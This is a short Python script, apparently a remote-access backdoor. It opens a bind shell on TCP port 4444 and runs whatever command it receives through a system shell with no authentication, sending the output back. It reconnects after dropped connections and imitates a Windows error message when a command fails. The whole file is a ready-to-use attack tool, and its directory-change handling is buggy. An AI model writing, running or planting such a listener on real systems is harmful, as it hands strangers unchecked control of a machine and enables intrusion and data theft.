import os, sys
import socket
import subprocess as sb

def configuration():
    IP = socket.gethostname()
    PORT = 4444
    global s, conn
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((IP, PORT))
    s.listen(5)
    conn, addr = s.accept()

def cmd():
    try:
        while True:
            command = conn.recv(4000)
            command = command.decode()
            if command == ("exit"):
                conn.close()
                s.close()
                break
            elif ("cd") in command:
                command = str(command)
                dirs = command.split()[1]
                if len(dirs) > 2:
                    p1 = dirs[1] + str(" ")
                    p2 = dirs[2]
                    path = p1 + p2
                    os.chdir(path)
                else:
                    os.chdir(dirs)
                path = os.getcwd()
                send_args = ("change to " + path)
                conn.send(send_args.encode())
            elif ("pwd") in command:
                path = os.getcwd()
                conn.send(path.encode())
            else:
                execute = sb.check_output(f'{command}', shell=True)
                conn.send(execute)

    except ConnectionResetError:
        configuration()
        cmd()
    except ConnectionAbortedError:
        configuration()
        cmd()
    except ConnectionError:
        configuration()
        cmd()
    except BrokenPipeError:
        configuration()
        cmd()
    except sb.CalledProcessError:
        conn.send(str(f"'{command}' is not recognized as an internal or external command,\noperable program or batch file").encode())
        cmd()

def active():
    configuration()
    cmd()